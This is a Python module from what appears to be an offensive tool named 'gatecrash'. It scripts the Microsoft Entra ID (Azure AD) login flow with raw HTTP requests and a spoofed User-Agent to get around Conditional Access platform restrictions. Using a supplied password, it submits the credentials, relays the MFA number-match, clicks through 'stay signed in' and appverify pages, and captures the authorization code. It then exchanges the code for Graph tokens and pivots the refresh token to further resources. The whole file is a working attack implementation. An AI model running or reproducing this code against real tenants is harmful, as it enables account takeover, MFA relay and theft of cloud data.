"""Lightweight platform bypass via pure requests (no Selenium).

Drives the AAD login flow (authorize -> credential type -> password -> MFA -> code)
using only HTTP requests with a spoofed User-Agent, then exchanges the code for tokens.

Advantages over the Selenium path:
 - No browser/chromedriver dependency
 - Works on any platform (Windows, Linux, macOS)
 - Faster startup
 - No headless/xvfb complexity

Limitation: relies on Azure returning the auth code in the ProcessAuth HTML.
If the page requires client-side JS execution we can't handle (beyond the
standard MFA flow), fall back to the Selenium module.
"""
import base64
import hashlib
import re
import secrets
import time

import requests

from lib import clients, ua as ua_lib
from lib.logger import logged_session, get as get_log
from lib.oauth import exchange_code_v2, refresh_v2
from lib.util import decode_jwt, extract_code, now_iso, write_mfa_number, LOGIN
from modules import mfa_handler
from modules.token_ops import store_token

NATIVE_REDIRECT = clients.NATIVE_REDIRECT
OFFICE = clients.CLIENTS["office"]


def _pkce():
    verifier = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode().rstrip("=")
    challenge = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode()).digest()).decode().rstrip("=")
    return verifier, challenge


def _extract_field(html, name):
    m = re.search(rf'"{name}":"([^"]*)"', html)
    return m.group(1) if m else None


def _follow_form_redirects(session, html, max_redirects=5):
    """Follow auto-submit form redirects ('Working...' pages in AAD login flow).
    Returns (final_html, final_url_or_None). Checks every intermediate step for
    the auth code in URLs and HTML to avoid missing it."""
    url = None
    for _ in range(max_redirects):
        if "<title>Working...</title>" not in html and 'document.forms[0].submit()' not in html:
            return html, url
        action = re.search(r'<form[^>]+action="([^"]+)"', html)
        if not action:
            return html, url
        fields = dict(re.findall(r'<input[^>]+name="([^"]+)"[^>]+value="([^"]*)"', html))
        if not fields:
            return html, url
        r = session.post(action.group(1), data=fields, allow_redirects=True, timeout=30)
        url = r.url
        html = r.text
        # Check redirect history for code in URL
        for hist in getattr(r, "history", []):
            loc = hist.headers.get("Location", "")
            if "code=" in loc:
                return html, loc
        if "code=" in (url or ""):
            return html, url
    return html, url


def run(cfg, eng, args):
    platform = getattr(args, "method", "requests-macos").replace("requests-", "")
    ua_str = ua_lib.get(platform)
    print(f"[requests-bypass] Platform bypass via {platform} UA (no browser)")
    if not cfg.password:
        raise SystemExit("[requests-bypass] Password required in config.")

    verifier, challenge = _pkce()
    log = get_log()
    log.info(f"[requests-bypass] Generating PKCE challenge...")
    session = logged_session("bypass")
    session.headers.update({"User-Agent": ua_str})

    auth_url = (
        f"{LOGIN}/{cfg.tenant_id}/oauth2/v2.0/authorize?"
        f"client_id={OFFICE}&response_type=code&redirect_uri={NATIVE_REDIRECT}"
        f"&scope=User.Read+Mail.Read+Files.Read.All+offline_access"
        f"&code_challenge={challenge}&code_challenge_method=S256"
        f"&login_hint={cfg.username}&response_mode=query"
    )

    # Step 1: GET authorize page
    log.info(f"[requests-bypass] Step 1: Loading authorize page...")
    r = session.get(auth_url, allow_redirects=True, timeout=30)
    code = _code_from_url(r.url)
    if code:
        return _finish(cfg, eng, code, verifier, ua_str, platform)

    html = r.text
    for ca_code in ("530003", "53003", "530084"):
        if ca_code in html:
            eng.save_evidence(f"reqbypass_{platform}_{ca_code}.html", html)
            raise SystemExit(f"[requests-bypass] CA block ({ca_code}) at authorize. No bypass here.")

    sFT = _extract_field(html, "sFT")
    sCtx = _extract_field(html, "sCtx")
    canary = _extract_field(html, "canary")
    urlPost = _extract_field(html, "urlPost")
    if not sFT:
        eng.save_evidence(f"reqbypass_{platform}_no_flowtoken.html", html)
        raise SystemExit("[requests-bypass] No flowToken on authorize page.")

    # Step 2: GetCredentialType
    log.info(f"[requests-bypass] Step 2: GetCredentialType for {cfg.username}...")
    gct_url = f"{LOGIN}/common/GetCredentialType?mkt=en-US"
    gct = session.post(gct_url, json={
        "username": cfg.username, "isOtherIdpSupported": True,
        "checkPhones": False, "flowToken": sFT, "originalRequest": sCtx
    }, headers={"canary": canary or ""}, timeout=15)
    try:
        gj = gct.json()
        sFT = gj.get("FlowToken", sFT)
    except ValueError:
        pass

    # Step 3: POST password
    log.info(f"[requests-bypass] Step 3: Submitting password...")
    post_url = urlPost if urlPost and urlPost.startswith("http") else f"{LOGIN}/{cfg.tenant_id}/login"
    r2 = session.post(post_url, data={
        "login": cfg.username, "loginfmt": cfg.username, "passwd": cfg.password,
        "flowToken": sFT, "ctx": sCtx, "canary": canary,
        "ps": "2", "type": "11"
    }, allow_redirects=True, timeout=30)

    code = _code_from_url(r2.url) or extract_code(r2.text)
    if code:
        return _finish(cfg, eng, code, verifier, ua_str, platform)

    # Follow any intermediate auto-submit form redirects (device.login.microsoftonline.com)
    html, redir_url = _follow_form_redirects(session, r2.text)

    code = _code_from_url(redir_url) or extract_code(html)
    if code:
        return _finish(cfg, eng, code, verifier, ua_str, platform)

    for ca_code in ("530003", "53003", "530084"):
        if ca_code in html:
            eng.save_evidence(f"reqbypass_{platform}_postlogin_{ca_code}.html", html)
            raise SystemExit(f"[requests-bypass] CA block ({ca_code}) after password.")

    err = _extract_field(html, "sErrorCode") or ""
    if err in ("50126", "50034"):
        raise SystemExit(f"[requests-bypass] Auth failed: {err} (bad creds or user not found).")

    # Re-extract flow tokens from the page we're on now (may have changed after form redirect)
    sFT = _extract_field(html, "sFT") or sFT
    sCtx = _extract_field(html, "sCtx") or sCtx
    canary = _extract_field(html, "canary") or canary

    # Step 4: MFA
    log.info(f"[requests-bypass] Step 4: Checking for MFA challenge...")
    if "50076" in html or "proofup" in html.lower() or "PhoneAppNotification" in html:
        print("[requests-bypass] MFA page (50076, MFA only, no device compliance).")
        sFT2 = sFT
        sCtx2 = sCtx
        code = _do_mfa(session, cfg, eng, sCtx2, sFT2, platform)
        if code:
            return _finish(cfg, eng, code, verifier, ua_str, platform)
        print("[requests-bypass] MFA completed but no auth code obtained.")
        print("[requests-bypass] If you see 530003 above: the interactive authorize flow re-applied")
        print("[requests-bypass] Conditional Access (gotcha #7). The ROPC UA bypass (50076) does not")
        print("[requests-bypass] carry to the interactive token grant on this tenant.")
        return {"blocked": True, "reason": "ca_interactive_block"}

    eng.save_evidence(f"reqbypass_{platform}_unknown.html", html)
    raise SystemExit(f"[requests-bypass] Unexpected page state. Error={err}. Saved to evidence.")


def _do_mfa(session, cfg, eng, ctx, ft, platform):
    """Drive the SAS MFA flow via pure requests."""
    begin = mfa_handler.begin_auth(session, ctx, ft)
    number = begin.get("Entropy")
    if number:
        write_mfa_number(str(number), cfg.mfa_number_file)

    ctx2, ft2 = mfa_handler.poll_end_auth(
        session, begin.get("SessionId"), begin.get("FlowToken", ft),
        begin.get("Ctx", ctx), timeout=cfg.mfa_timeout)

    # ProcessAuth (must use data=, not json=)
    resp = mfa_handler.process_auth(session, ctx2, ft2)
    eng.save_evidence(f"reqbypass_{platform}_processauth.html",
                      f"URL: {resp.url}\nHistory: {[(h.status_code, h.headers.get('Location','')[:120]) for h in getattr(resp,'history',[])]}\n\n{resp.text[:3000]}")
    print(f"[requests-bypass] ProcessAuth -> {resp.url[:80]}")
    code = extract_code(resp.text) or _code_from_url(resp.url)
    if code:
        return code

    # Follow auto-submit form redirects after ProcessAuth
    html, redir_url = _follow_form_redirects(session, resp.text)
    code = _code_from_url(redir_url) or extract_code(html)
    if code:
        return code

    # Try following redirects from the ProcessAuth response history
    for r in getattr(resp, "history", []):
        c = _code_from_url(r.headers.get("Location", ""))
        if c:
            return c
    # Handle KMSI/CmsiInterrupt and other interstitials (up to 5 iterations)
    for _ in range(5):
        nft = _extract_field(html, "sFT") or ft2
        nctx = _extract_field(html, "sCtx") or ctx2
        ncanary = _extract_field(html, "canary") or ""
        url_post = _extract_field(html, "urlPost")
        lower = html.lower()

        is_interstitial = any(m in lower for m in (
            "kmsi", "cmsiinterrupt", "stay signed in", "reduce the number",
            "don't show this again", "protect your account", "skip for now"))

        if is_interstitial and nft:
            print("[requests-bypass] KMSI/interstitial page, clicking through...")
            post_to = url_post if url_post and url_post.startswith("http") else f"{LOGIN}/kmsi"
            r3 = session.post(post_to, data={
                "LoginOptions": "1", "type": "28", "ctx": nctx,
                "flowToken": nft, "canary": ncanary,
            }, allow_redirects=True, timeout=30)
            eng.save_evidence(f"reqbypass_{platform}_kmsi_resp.html",
                              f"POST to: {post_to}\nURL: {r3.url}\nHistory: {[(h.status_code, h.headers.get('Location','')[:120]) for h in getattr(r3,'history',[])]}\n\n{r3.text[:2000]}")
            for r in getattr(r3, "history", []):
                c = _code_from_url(r.headers.get("Location", ""))
                if c:
                    return c
            html, redir_url = _follow_form_redirects(session, r3.text)
            code = _code_from_url(redir_url) or _code_from_url(r3.url) or extract_code(html)
            if code:
                return code
            continue

        if "appverify" in lower and nft:
            print("[requests-bypass] Appverify page, posting through...")
            r3 = session.post(f"{LOGIN}/appverify", data={
                "ctx": nctx, "flowToken": nft, "canary": ncanary
            }, allow_redirects=True, timeout=30)
            html, redir_url = _follow_form_redirects(session, r3.text)
            code = _code_from_url(redir_url) or _code_from_url(r3.url) or extract_code(html)
            if code:
                return code
            continue

        # Check for CA block after MFA (gotcha #7)
        for ca_code in ("530003", "53003", "530084"):
            if ca_code in html:
                print(f"[requests-bypass] CA block ({ca_code}) after MFA (gotcha #7).")
                eng.save_evidence(f"reqbypass_{platform}_postmfa_{ca_code}.html", html)
                return None

        break

    eng.save_evidence(f"reqbypass_{platform}_no_code.html", html)
    return None


def _code_from_url(url):
    if url and "code=" in url:
        m = re.search(r"code=([^&]+)", url)
        return m.group(1) if m else None
    return None


def _finish(cfg, eng, code, verifier, ua_str, platform):
    log = get_log()
    log.info(f"[requests-bypass] Auth code captured ({code[:20]}...).")
    log.info(f"[requests-bypass] Exchanging auth code for tokens (PKCE)...")
    session = logged_session("token-exchange")
    status, tok = exchange_code_v2(session, cfg.tenant_id, OFFICE, code,
                                   NATIVE_REDIRECT, verifier, ua=ua_str)
    if "access_token" not in tok:
        raise SystemExit(f"[requests-bypass] Token exchange failed: {tok.get('error_description', tok)[:200]}")

    saved = store_token(eng, "graph", tok, cfg, source="gatecrash",
                        meta={"platform": platform, "method": "requests"})
    claims = decode_jwt(tok["access_token"])
    log.info(f"[requests-bypass] GOT GRAPH TOKEN:")
    log.info(f"[requests-bypass]   Audience:  {claims.get('aud')}")
    log.info(f"[requests-bypass]   UPN:       {claims.get('upn')}")
    log.info(f"[requests-bypass]   DeviceID:  {claims.get('deviceid', 'NONE')}")
    log.info(f"[requests-bypass]   AMR:       {claims.get('amr')}")
    log.info(f"[requests-bypass]   Scopes:    {claims.get('scp', 'N/A')}")
    log.info(f"[requests-bypass]   Expires:   {claims.get('exp')}")
    log.info(f"[requests-bypass]   Saved to:  {saved}")
    has_rt = "yes" if tok.get("refresh_token") else "no"
    log.info(f"[requests-bypass]   Refresh:   {has_rt}")

    _pivot(cfg, eng, tok.get("refresh_token"), ua_str)
    return {"graph_token": saved}


def _pivot(cfg, eng, refresh_token, ua_str):
    log = get_log()
    if not refresh_token:
        log.info("[requests-bypass] No refresh token; skipping pivot.")
        return
    log.info(f"[requests-bypass] Pivoting refresh token to {len(clients.PIVOT_SCOPES)} resources...")
    session = logged_session("pivot")
    for name in clients.PIVOT_SCOPES:
        scope = clients.v2_scope(name, cfg.sharepoint_host)
        status, tok = refresh_v2(session, cfg.tenant_id, OFFICE, refresh_token, scope, ua=ua_str)
        if "access_token" in tok:
            store_token(eng, name, tok, cfg, source="gatecrash", meta={"pivot_from": "graph"})
            claims = decode_jwt(tok["access_token"])
            print(f"  {name}: TOKEN (aud={claims.get('aud')})")
        else:
            print(f"  {name}: {status} {tok.get('error', '')}")
